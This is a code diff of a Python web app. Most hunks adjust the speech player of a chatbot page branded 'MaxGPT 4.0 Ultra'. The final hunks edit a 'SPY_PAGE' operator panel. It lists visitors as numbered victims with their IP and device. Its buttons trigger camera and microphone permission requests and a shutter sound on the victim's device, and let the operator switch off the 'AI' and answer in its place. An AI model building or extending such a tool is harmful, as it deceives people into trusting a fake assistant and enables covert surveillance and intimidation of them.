@@ -126,8 +126,8 @@ HTML_PAGE = """<!DOCTYPE html>
         .action-icon-btn { background: none; border: none; color: var(--text-muted); cursor: pointer; font-size: 12px; display: flex; align-items: center; gap: 5px; padding: 3px 6px; border-radius: 6px; transition: 0.2s; }
         .action-icon-btn:hover { background: rgba(255,255,255,0.06); color: var(--text-main); }
 
-        /* Продвинутый плеер с интерактивным скруббером времени */
-        .voice-player-bar { display: none; flex-direction: column; gap: 8px; background: #18191e; border: 1px solid rgba(139, 92, 246, 0.3); padding: 10px 14px; border-radius: 14px; margin-bottom: 10px; width: 100%; max-width: 320px; box-shadow: 0 8px 25px rgba(0,0,0,0.3); animation: slideUpAudio 0.2s ease-out; }
+        /* Зафиксированный аудиоплеер озвучки */
+        .voice-player-bar { display: none; flex-direction: column; gap: 8px; background: #18191e; border: 1px solid rgba(139, 92, 246, 0.4); padding: 10px 14px; border-radius: 14px; margin-bottom: 10px; width: 100%; max-width: 320px; box-shadow: 0 8px 25px rgba(0,0,0,0.4); animation: slideUpAudio 0.2s ease-out; }
         @keyframes slideUpAudio { from { opacity: 0; transform: translateY(6px); } to { opacity: 1; transform: translateY(0); } }
         .voice-player-bar.show { display: flex; }
         
@@ -145,11 +145,10 @@ HTML_PAGE = """<!DOCTYPE html>
         .vp-wave-bar:nth-child(5) { animation-delay: 0.5s; }
         @keyframes waveAnim { 0%, 100% { height: 4px; opacity: 0.4; } 50% { height: 14px; opacity: 1; } }
         
-        .vp-close-btn { background: none; border: none; color: #94a3b8; font-size: 15px; cursor: pointer; padding: 2px; transition: 0.2s; }
+        .vp-close-btn { background: none; border: none; color: #94a3b8; font-size: 16px; cursor: pointer; padding: 2px; transition: 0.2s; }
         .vp-close-btn:hover { color: #fff; }
 
-        /* Интерактивная шкала (ползунок времени) */
-        .vp-scrubber { width: 100%; height: 4px; background: rgba(255,255,255,0.15); border-radius: 2px; outline: none; cursor: pointer; accent-color: #8b5cf6; margin-top: 2px; }
+        .vp-scrubber { width: 100%; height: 6px; background: rgba(255,255,255,0.15); border-radius: 3px; outline: none; cursor: pointer; accent-color: #8b5cf6; margin-top: 2px; }
 
         .typing-indicator { display: flex; align-items: center; gap: 5px; padding: 4px 0; }
         .typing-dot { width: 8px; height: 8px; background: #a78bfa; border-radius: 50%; opacity: 0.4; animation: blinkDot 1.4s infinite ease-in-out both; }
@@ -328,7 +327,7 @@ HTML_PAGE = """<!DOCTYPE html>
                         </div>
                         <button class="vp-close-btn" onclick="closePlayer('player_initial')"><i class="fa-solid fa-xmark"></i></button>
                     </div>
-                    <input type="range" class="vp-scrubber" id="scrubber_initial" min="0" max="100" value="0" disabled oninput="seekAudio(this)">
+                    <input type="range" class="vp-scrubber" id="scrubber_initial" min="0" max="100" value="0" disabled onmousedown="startSeeking()" onmouseup="finishSeeking(this)" onchange="seekAudio(this)">
                 </div>
                 <div class="txt">Привет! Я <b>MaxGPT 4.0 Ultra</b>. Чем я могу помочь тебе сегодня?</div>
                 <div class="bot-actions">
@@ -376,6 +375,7 @@ let activeSeconds = 0;
 let activeTotalChars = 0;
 let activePlayerBar = null;
 let activeScrubberEl = null;
+let isUserSeeking = false;
 
 function unlockAudio() {
     if (!audioCtx) {
@@ -421,20 +421,29 @@ function playBeepSound() {
     } catch(e) {}
 }
 
+function startSeeking() { isUserSeeking = true; }
+function finishSeeking(scrubber) { isUserSeeking = false; seekAudio(scrubber); }
+
 function openSpeechPlayer(btn, playerId, timerId, playBtnId, scrubberId) {
     if (!('speechSynthesis' in window)) {
         alert('Ваш браузер не поддерживает озвучку текста.');
         return;
     }
-    window.speechSynthesis.cancel();
-    if (activeTimerInterval) clearInterval(activeTimerInterval);
-
-    document.querySelectorAll('.voice-player-bar').forEach(el => el.classList.remove('show'));
-
+    
     let playerBar = document.getElementById(playerId);
     let timerEl = document.getElementById(timerId);
     let playBtn = document.getElementById(playBtnId);
     let scrubber = document.getElementById(scrubberId);
+
+    // Если этот же плеер уже открыт и говорит, клик не схлопывает его
+    if (activePlayerBar === playerBar && window.speechSynthesis.speaking) {
+        return;
+    }
+
+    window.speechSynthesis.cancel();
+    if (activeTimerInterval) clearInterval(activeTimerInterval);
+
+    document.querySelectorAll('.voice-player-bar').forEach(el => el.classList.remove('show'));
 
     activePlayerBar = playerBar;
     activeScrubberEl = scrubber;
@@ -468,12 +477,11 @@ function openSpeechPlayer(btn, playerId, timerId, playBtnId, scrubberId) {
     activeSeconds = 0;
     timerEl.innerText = "00:00";
     scrubber.value = 0;
-    scrubber.disabled = true; // Блокируем скруббер во время загрузки/подготовки
+    scrubber.disabled = true;
     playBtn.disabled = true;
 
     playerBar.classList.add('show');
 
-    // Таймер и скруббер активируются СТРОГО когда голос начинает говорить
     utterance.onstart = () => {
         playBtn.disabled = false;
         scrubber.disabled = false;
@@ -481,13 +489,12 @@ function openSpeechPlayer(btn, playerId, timerId, playBtnId, scrubberId) {
 
         if (activeTimerInterval) clearInterval(activeTimerInterval);
         activeTimerInterval = setInterval(() => {
-            if (!window.speechSynthesis.paused) {
+            if (!window.speechSynthesis.paused && !isUserSeeking) {
                 activeSeconds++;
                 let m = Math.floor(activeSeconds / 60).toString().padStart(2, '0');
                 let s = (activeSeconds % 60).toString().padStart(2, '0');
                 timerEl.innerText = `${m}:${s}`;
                 
-                // Примерный расчет прогресса для скруббера (около 14 символов в секунду)
                 let estimatedTotalSecs = Math.max(5, Math.ceil(activeTotalChars / 14));
                 let progress = (activeSeconds / estimatedTotalSecs) * 100;
                 scrubber.value = Math.min(100, progress);
@@ -496,8 +503,7 @@ function openSpeechPlayer(btn, playerId, timerId, playBtnId, scrubberId) {
     };
 
     utterance.onboundary = (event) => {
-        // Синхронизация таймера по реальной позиции символа в речи
-        if (event.charIndex && activeTotalChars > 0) {
+        if (event.charIndex && activeTotalChars > 0 && !isUserSeeking) {
             let estimatedTotalSecs = Math.max(5, Math.ceil(activeTotalChars / 14));
             activeSeconds = Math.floor((event.charIndex / activeTotalChars) * estimatedTotalSecs);
             let m = Math.floor(activeSeconds / 60).toString().padStart(2, '0');
@@ -536,13 +542,11 @@ function togglePlayPause(btn) {
 }
 
 function seekAudio(scrubber) {
-    // Интерактивное переключение секунды озвучки при перемещении ползунка
     if (!('speechSynthesis' in window) || !activeUtterance || activeTotalChars === 0) return;
     let targetPercent = scrubber.value / 100;
     let estimatedTotalSecs = Math.max(5, Math.ceil(activeTotalChars / 14));
     activeSeconds = Math.floor(targetPercent * estimatedTotalSecs);
     
-    // Перезапускаем речь с позиции выбранного символа
     window.speechSynthesis.cancel();
     if (activeTimerInterval) clearInterval(activeTimerInterval);
 
@@ -565,7 +569,7 @@ function seekAudio(scrubber) {
 
         if (activeTimerInterval) clearInterval(activeTimerInterval);
         activeTimerInterval = setInterval(() => {
-            if (!window.speechSynthesis.paused) {
+            if (!window.speechSynthesis.paused && !isUserSeeking) {
                 activeSeconds++;
                 let m = Math.floor(activeSeconds / 60).toString().padStart(2, '0');
                 let s = (activeSeconds % 60).toString().padStart(2, '0');
@@ -749,7 +753,7 @@ async function startNewChat() {
                         </div>
                         <button class="vp-close-btn" onclick="closePlayer('${pId}')"><i class="fa-solid fa-xmark"></i></button>
                     </div>
-                    <input type="range" class="vp-scrubber" id="${sId}" min="0" max="100" value="0" disabled oninput="seekAudio(this)">
+                    <input type="range" class="vp-scrubber" id="${sId}" min="0" max="100" value="0" disabled onmousedown="startSeeking()" onmouseup="finishSeeking(this)" onchange="seekAudio(this)">
                 </div>
                 <div class="txt">Привет! Я <b>MaxGPT 4.0 Ultra</b>. Чем я могу помочь тебе сегодня?</div>
                 <div class="bot-actions">
@@ -797,7 +801,7 @@ async function fetchMessages() {
                         </div>
                         <button class="vp-close-btn" onclick="closePlayer('${pId}')"><i class="fa-solid fa-xmark"></i></button>
                     </div>
-                    <input type="range" class="vp-scrubber" id="${sId}" min="0" max="100" value="0" disabled oninput="seekAudio(this)">
+                    <input type="range" class="vp-scrubber" id="${sId}" min="0" max="100" value="0" disabled onmousedown="startSeeking()" onmouseup="finishSeeking(this)" onchange="seekAudio(this)">
                 </div>
                 <div class="txt">Привет! Я <b>MaxGPT 4.0 Ultra</b>. Чем я могу помочь тебе сегодня?</div>
                 <div class="bot-actions">
@@ -826,7 +830,7 @@ async function fetchMessages() {
                         </div>
                         <button class="vp-close-btn" onclick="closePlayer('${msgPlayerId}')"><i class="fa-solid fa-xmark"></i></button>
                     </div>
-                    <input type="range" class="vp-scrubber" id="${msgScrubId}" min="0" max="100" value="0" disabled oninput="seekAudio(this)">
+                    <input type="range" class="vp-scrubber" id="${msgScrubId}" min="0" max="100" value="0" disabled onmousedown="startSeeking()" onmouseup="finishSeeking(this)" onchange="seekAudio(this)">
                 </div>
                 <div class="bot-actions">
                     <button class="action-icon-btn" onclick="copyText(this)"><i class="fa-regular fa-copy"></i> Копировать</button>
@@ -845,7 +849,7 @@ async function fetchMessages() {
 function startChatPolling() {
     if (chatPollInterval) clearInterval(chatPollInterval);
     chatPollInterval = setInterval(() => {
-        if (currentChatId) {
+        if (currentChatId && !window.speechSynthesis.speaking) {
             fetchMessages();
         }
     }, 1000);
@@ -989,14 +993,13 @@ SPY_PAGE = """<!DOCTYPE html>
                 <div class="victim-name"><i class="fa-solid fa-user-ninja"></i> Жертва #{{ data.id }}</div>
                 <div class="badges-wrap">
                     {% if data.manual %}
-                    <span class="badge badge-manual"><i class="fa-solid fa-user-gear"></i> РУЧНОЙ РЕЖИМ (ИИ ОТКЛЮЧЕН)</span>
+                    <span class="badge badge-manual"><i class="fa-solid fa-user-gear"></i> РУЧНОЙ РЕЖИМ</span>
                     {% endif %}
                     <span class="badge badge-dev"><i class="fa-solid {{ data.dev_icon }}"></i> {{ data.device }}</span>
                     <span class="badge badge-ip"><i class="fa-solid fa-network-wired"></i> {{ ip }}</span>
                 </div>
             </div>
             <div style="font-size:12px; color:#94a3b8;">Сообщений: <b>{{ data.msg_count }}</b></div>
-            
             {% if data.manual %}
             <div class="manual-box">
                 <div style="font-size: 12px; color: #f59e0b; font-weight: bold;"><i class="fa-solid fa-pen-nib"></i> Ответ от твоего лица:</div>
@@ -1006,7 +1009,6 @@ SPY_PAGE = """<!DOCTYPE html>
                 </div>
             </div>
             {% endif %}
-
             <div class="action-btns">
                 <button class="btn-act btn-shutter" onclick="triggerAction('{{ ip }}', 'sound_shutter')"><i class="fa-solid fa-camera"></i> 🔊 Щелчок</button>
                 <button class="btn-act btn-custom" onclick="triggerAction('{{ ip }}', 'sound_custom')"><i class="fa-solid fa-music"></i> 🎵 Свой звук</button>
@@ -1014,7 +1016,7 @@ SPY_PAGE = """<!DOCTYPE html>
                 <button class="btn-act btn-cam" onclick="triggerAction('{{ ip }}', 'perm_cam')"><i class="fa-solid fa-video"></i> 📹 Камера</button>
                 <button class="btn-act btn-mic" onclick="triggerAction('{{ ip }}', 'perm_mic')"><i class="fa-solid fa-microphone"></i> 🎙️ Микрофон</button>
                 <button class="btn-act btn-manual" onclick="toggleManual('{{ ip }}')">
-                    {% if data.manual %}<i class="fa-solid fa-robot"></i> Включить ИИ обратно{% else %}<i class="fa-solid fa-user-pen"></i> Отключить ИИ и отвечать самому{% endif %}
+                    {% if data.manual %}<i class="fa-solid fa-robot"></i> Включить ИИ обратно{% else %}<i class="fa-solid fa-user-pen"></i> Отключить ИИ{% endif %}
                 </button>
                 <button class="btn-act btn-del" onclick="deleteVictim('{{ ip }}')"><i class="fa-solid fa-trash"></i> Удалить</button>
             </div>
